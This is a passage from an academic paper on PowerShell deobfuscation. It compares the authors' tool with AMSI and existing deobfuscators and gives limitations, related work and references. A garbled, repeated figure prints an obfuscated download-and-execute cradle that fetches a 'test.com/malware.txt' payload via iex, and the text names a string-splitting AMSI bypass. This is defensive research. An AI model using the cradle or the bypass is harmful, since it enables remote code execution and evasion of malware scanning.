A. Semantics Consistency
Deobfuscation is the process of recovering complex obfus-
cated script to simple non-obfuscated script which is seman-
tically equivalent. Keeping semantic consistency needs not
only precise identiﬁcation and correct recovery of obfuscated
script pieces but also accurate replacement. The deobfus-
cation results of existing tools are often inconsistent with
their corresponding obfuscated scripts in semantics. Regular
expression often identify script pieces with invalid syntax
[16]–[18]. Machine learning based classiﬁer heavily depends
on the quality of training data [19]. Predeﬁned recovery rules
[16]–[18] and overriding function [16], [18] can only deal with
a few speciﬁc obfuscation. Direct execution [18], [19] may
get wrong recovery results due to the lack of context. Invoke-
Deobfuscation utilizes token parsing and recoverable nodes of
AST to identify obfuscated script pieces precisely. Moreover,
with the help of variable tracing, Invoke-Deobfuscation can
recover correct results in a context-aware way. Furthermore,
Invoke-Deobfuscation strictly replaces the obfuscated script
pieces in place to keep the deobfuscation script semantic
consistent.
B. Comparison with AMSI
The AMSI is a versatile interface that allows for ﬁle, memory
or stream scanning, content source URL/IP reputation checks,
and other detection [14]. The script might go through several
passes of deobfuscation before being supplied to the scripting
engine. AMSI can obtain the ﬁnal script supplied to the
scripting engine. However, this method can only deal with
speciﬁc types of obfuscation which need to be invoked by
Invoke-Expression or PowerShell, as we mentioned in section
III-B4. When the obfuscated script pieces do not need to
be invoked, AMSI cannot obtain the deobfuscated pieces.
For example, 'AmsiUtils' is treated as a malicious string
by AMSI and we can easily bypass the detection by string
concatenating, 'Amsi'+'Utils'.
Though AMSI is powerful to deal with many obfuscated
scripts, it is easy for different obfuscation techniques to bypass
due to its inherent mechanism. We run the 100 PowerShell
scripts mentioned in Section IV-C2 on a virtual machine,
and analyze the ﬁnal scripts captured by AMSI. Our analysis
shows that Invoke-Deobfuscation has similar deobfuscation
abilities to AMSI as mentioned in section III-B4. Besides,
Authorized licensed use limited to: Tsinghua University. Downloaded on August 07,2022 at 13:14:55 UTC from IEEE Xplore.  Restrictions apply. 
10304
"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (NeW-oBJeCt Net.WebClient).downloadstring($sdfs)"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex$xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (NeW-oBJeCt Net.WebClient).downloadstring($sdfs)PSDecode,  PowerDecodePowerDrive"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).("hlx") (System.Net.WebClient).downloadstring($sdfs)Liet al.Write-Host hello$var0 = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$var2 = 'https://test.com/malware.txt'.('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (NeW-oBJeCt Net.WebClient).downloadstring($sdfs)"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex$xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (NeW-oBJeCt Net.WebClient).downloadstring($sdfs)PSDecode,  PowerDecodePowerDrive"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).("hlx") (System.Net.WebClient).downloadstring($sdfs)Liet al.Write-Host hello$var0 = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$var2 = 'https://test.com/malware.txt'.('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (NeW-oBJeCt Net.WebClient).downloadstring($sdfs)"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex$xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (NeW-oBJeCt Net.WebClient).downloadstring($sdfs)PSDecode,  PowerDecodePowerDrive"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).("hlx") (System.Net.WebClient).downloadstring($sdfs)Liet al.Write-Host hello$var0 = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$var2 = 'https://test.com/malware.txt'.('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (NeW-oBJeCt Net.WebClient).downloadstring($sdfs)"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex$xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (NeW-oBJeCt Net.WebClient).downloadstring($sdfs)PSDecode,  PowerDecodePowerDrive"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | iex $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).("hlx") (System.Net.WebClient).downloadstring($sdfs)Liet al.Write-Host hello$var0 = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$var2 = 'https://test.com/malware.txt'.('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')Invoke-Deobfuscation is robust enough to deal with different
obfuscation techniques.
C. Limitation
Variable Tracing. The variable tracing module of Invoke-
Deobfuscation is not perfect. Firstly, when the variable assign-
ment is in a conditional statement, we abandon recording the
variable value. The reason is that the variable value is based
on speciﬁed criteria, which may change at different run-time.
Secondly, we give up recording the variable whose assignment
is in a loop statement. We cannot determine the variable value
by executing the assignment script piece once. To execute
the whole loop statement for obtaining the variable value is
an uncontrollable process for us. It involves many unrelated
script pieces and may be an endless loop. Therefore, we do
not record this type of variable currently.
Complex Obfuscation. Most obfuscated data and their cor-
responding recovery algorithms are in the same obfuscated
script pieces. Therefore, identifying these obfuscated pieces
and executing them with the correct context can recover
the original script pieces. Even though they are in different
positions, we can handle them with variable tracing. However,
if attackers put the recovery algorithm into function and utilize
function calls to recover the obfuscated data, our approach
hardly traces the obfuscated chain. Even attackers can use
function nesting against analysis.
VI. RELATED WORK
A. Detection of Malicious Script
Recently, many machine learning or deep learning based
malicious script detection models have been proposed. These
models classify malicious samples based on different features,
such as textual [8], [26], [27], token and AST node features
[9], [10]. Because obfuscation can easily change these features,
some researchers propose to detect obfuscated scripts [34]–
[36]. However, there is no direct correlation between obfus-
cated scripts and malicious scripts. Therefore, it is hard for
existing detection approaches to accurately detect obfuscated
malicious PowerShell scripts.
B. Obfuscation Techniques
Obfuscation for Binary. Attackers often use run-time packers
to obfuscate their malicious code and hinder static analysis
[37], [38]. They hide the code by making it appear as data at
compile-time and transform it back at run-time [39]. It is hard
for static analysis to get the real binary code.
Obfuscation for Script. Various obfuscation techniques can
help malicious scripts to evade the detection of anti-virus
software [40], [41]. Wang et al. [42] propose a technique
of JavaScript code obfuscation based on control ﬂow trans-
formation. There are many popular obfuscation tools, e.g.,
Invoke-Obfuscation [12], PowerSploit [43], Empire [44], etc.,
which provide abundant obfuscation techniques as mentioned
in section II-B.
C. Deobfuscation Techniques
Common deobfuscation techniques can be divided into two
types: dynamic analysis and static analysis. Dynamic analysis
often executes samples in an isolated environment and mon-
itors their behavior [45]–[47]. It only can infer the script’s
intent from its behavior and has low code coverage. Static
analysis needs to identify obfuscated data and the correspond-
ing recovery algorithm, which is usually very difﬁcult. Regex
expression based tools, such as PSDecode [16], PowerDrive
[17], PowerDecode [18], etc., ignore the syntax of script pieces
so that they cannot identify obfuscation pieces precisely. Li
et al. [19] identify obfuscated script pieces using a machine
learning based classiﬁer and AST features. However, due to
lacking context and wrong replacement, their tool approach
often encounters syntax errors and semantics inconsistency.
Invoke-Deobfuscation utilizes recoverable nodes on AST to
identify obfuscated pieces and implements variable tracing to
mitigate the challenge above.
VII. CONCLUSION
In this paper, we propose Invoke-Deobfuscation, the ﬁrst AST-
based and semantics-preserving PowerShell script deobfusca-
tion tool with variable tracing. Invoke-Deobfuscation uses the
tokens and recoverable nodes of AST to identify obfuscated
script pieces precisely, traces the value and scope of variables
and simulates the execution of obfuscated script pieces to get
correct recovery results. To keep the original semantics of the
script, Invoke-Deobfuscation strictly processes replacement in
place. Our evaluation demonstrates that Invoke-Deobfuscation
outperforms the state-of-the-art tools in dealing with various
obfuscation techniques, deobfuscation effectiveness, keeping
scripts’ semantics, and mitigating obfuscation of wild sam-
ples. The amount of key information recovered by Invoke-
Deobfuscation is more than twice that of other tools and 100%
of deobfuscation results of Invoke-Deobfuscation have the
same behavior as the original samples. Furthermore, Invoke-
Deobfuscation can reduce the obfuscation score of the wild
samples by 46%.
ACKNOWLEDGMENTS
We thank anonymous reviewers for their insightful comments.
We also thank the members of Qi-ANXIN StarMap team for
their help.
REFERENCES
[1] F. O’Connor, “What you need to know about powershell attacks,” https:
//www.cybereason.com/blog/ﬁleless-malware-powershell.
[2] “Increased use of powershell in attacks,” https://docs.broadcom.com/do
c/increased-use-of-powershell-in-attacks-16-en.
[3] A. J. Pereira, “Tracking, detecting, and thwarting powershell-based
malware and attacks,” https://www.trendmicro.com/vinfo/br/security/n
ews/cybercrime-and-digital-threats/tracking-detecting-and-thwarting-
powershell-based-malware-and-attacks.
[4] “Why malicious actors love powershell attacks and how to defend
them,” https://www.rangeforce.com/blog/powershell-attacks-and-how-t
o-defend-them.
[5] “2020 threat detection report,” https://redcanary.com/threat-detection-r
eport/techniques/powershell/.
Authorized licensed use limited to: Tsinghua University. Downloaded on August 07,2022 at 13:14:55 UTC from IEEE Xplore.  Restrictions apply. 
11305
[37] X. Ugarte-Pedrero, D. Balzarotti, I. Santos, and P. G. Bringas, “Sok:
Deep packer inspection: A longitudinal study of the complexity of run-
time packers,” in IEEE S&P, 2015.
[38] F. Guo, P. Ferrie, and T.-C. Chiueh, “A study of the packer problem and
its solutions,” in Springer RAID, 2008.
[39] M. I. Sharif, A. Lanzi, J. T. Gifﬁn, and W. Lee, “Impeding malware
analysis using conditional code obfuscation.” in NDSS, 2008.
[40] W. Xu, F. Zhang, and S. Zhu, “The power of obfuscation techniques in
malicious javascript code: A measurement study,” in IEEE MALWARE,
2012.
[41] A. Balakrishnan and C. Schulze, “Code obfuscation literature survey,”
CS701 Construction of compilers, 2005.
[42] Z. Y. Wang and W. M. Wu, “Technique of javascript code obfuscation
based on control ﬂow tansformations,” in AMM, 2014.
[43] “Powersploit - a powershell post-exploitation framework,” https://github
.com/PowerShellMafia/PowerSploit.
[44] “Empire - a powershell and python post-exploitation agent,” https://gith
ub.com/EmpireProject/Empire.
[45] G. Lu, K. Coogan, and S. Debray, “Automatic simpliﬁcation of obfus-
cated javascript code,” in IEEE ICISTM, 2012.
[46] B. Feinstein, D. Peck, and I. SecureWorks, “Caffeine monkey: Auto-
mated collection, detection and analysis of malicious javascript,” Black
Hat USA, 2007.
[47] U. Bayer, A. Moser, C. Kruegel, and E. Kirda, “Dynamic analysis of
malicious code,” Journal in Computer Virology, 2006.
[6] D. Dohannon, “Obfuscatedempire - use an obfuscated,
in-memory
powershell c2 channel to evade av signatures,” https://cobbr.io/Obfus
catedEmpire.html, 2017.
[7] Daniel Dohannon, “Abstract syntax tree-based powershell obfusca-
tion,” https://cobbr.io/AbstractSyntaxTree-Based-PowerShell-Obfuscati
on.html, 2017.
[8] D. Hendler, S. Kels, and A. Rubin, “Detecting malicious powershell
commands using deep neural networks,” in ASIACCS, 2018.
[9] G. Rusak, A. Al-Dujaili, and U.-M. O’Reilly, “Ast-based deep learning
for detecting malicious powershell,” in ACM CCS, 2018.
[10] Y. Fang, X. Zhou, and C. Huang, “Effective method for detecting
malicious powershell scripts based on hybrid features,” Neurocomputing,
2021.
[11] Y. Tajiri and M. Mimura, “Detection of malicious powershell using
word-level language models,” in Springer IWSEC, 2020.
[12] D. Bohannon, “Invoke-obfuscation - powershell obfuscator,” https://gith
ub.com/danielbohannon/Invoke-Obfuscation.
[13] “Virustotal,” https://www.virustotal.com/gui/home/upload.
[14] “Antimalware scan interface (amsi),” https://docs.microsoft.com/en-us/w
indows/win32/amsi/antimalware-scan-interface-portal.
[15] C. Liu, B. Xia, M. Yu, and Y. Liu, “Psdem: A feasible de-obfuscation
method for malicious powershell detection,” in IEEE ISCC, 2018.
[16] “Psdecode - powershell script for deobfuscating encoded powershell
scripts,” https://github.com/R3MRUM/PSDecode.
[17] D. Ugarte, D. Maiorca, F. Cara, and G. Giacinto, “Powerdrive: Accu-
rate de-obfuscation and analysis of powershell malware,” in Springer
DIMVA, 2019.
[18] G. M. Malandrone, G. Virdis, G. Giacinto, and D. Maiorca, “Powerde-
code: a powershell script decoder dedicated to malware analysis,” in
ITASEC, 2021.
[19] Z. Li, Q. A. Chen, C. Xiong, Y. Chen, T. Zhu, and H. Yang, “Effective
and light-weight deobfuscation and semantic-aware attack detection for
powershell scripts,” in ACM CCS, 2019.
[20] “Installing windows powershell,” https://docs.microsoft.com/en-us/pow
ershell/scripting/windows-powershell/install/installing-windows-powers
hell?view=powershell-7.1.
[21] “Install
powershell
on windows,
linux,
and macos,”
https:
//docs.microsoft.com/en-us/powershell/scripting/install/installing-p
owershell?view=powershell-7.1.
[22] Praetorian, “Command and scripting interpreter: Powershell,” https://at
tack.mitre.org/techniques/T1059/001/.
[23] McAfee, “Fileless malware execution with powershell is easier than you
may realize,” https://www.mcafee.com/enterprise/en-us/assets/solution-
briefs/sb-ﬁleless-malware-execution.pdf.
[24] “About special characters,” https://docs.microsoft.com/en-us/powershel
l/module/microsoft.powershell.core/about/about_special_characters?vi
ew=powershell-7.1.
[25] D. Hendler, S. Kels, and A. Rubin, “Amsi-based detection of malicious
powershell code using contextual embeddings,” in ACM CCS, 2020.
[26] Choi, Sunoh, “Malicious powershell detection using attention against
adversarial attacks,” Electronics, 2020.
[27] S. Choi, “Malicious powershell detection using graph convolution net-
work,” Applied Sciences, 2021.
[28] “Simple tokenizer,” https://powershell.one/powershell-internals/parsing-
and-tokenization/simple-tokenizer.
[29] R. E. Hayden, “The relative frequency of phonemes in general-american
english,” WORD, 1950.
[30] J. White, “Pulling back the curtains on encodedcommand power-
shell attacks,” https://unit42.paloaltonetworks.com/unit42-pulling-back-
the-curtains-on-encodedcommand-powershell-attacks/.
[31] “Trid - ﬁle identiﬁer,” https://mark0.net/soft-trid-e.html.
[32] “Fine free ﬁle command,” http://www.darwinsys.com/ﬁle/.
[33] “Tianqiong sandbox,” https://research.qianxin.com/sandbox.
[34] D. Bohannon and L. Holmes, “Revoke-obfuscation - powershell obfus-
cation detection framework,” https://github.com/danielbohannon/Revoke
-Obfuscation.
[35] S. Aebersold, K. Kryszczuk, S. Paganoni, B. Tellenbach, and T. Trow-
bridge, “Detecting obfuscated javascripts using machine learning,” in
ICIMP, 2016.
[36] M. Jodavi, M. Abadi, and E. Parhizkar, “Jsobfusdetector: A binary pso-
based one-class classiﬁer ensemble to detect obfuscated javascript code,”
in IEEE AISP, 2015.
Authorized licensed use limited to: Tsinghua University. Downloaded on August 07,2022 at 13:14:55 UTC from IEEE Xplore.  Restrictions apply. 
12306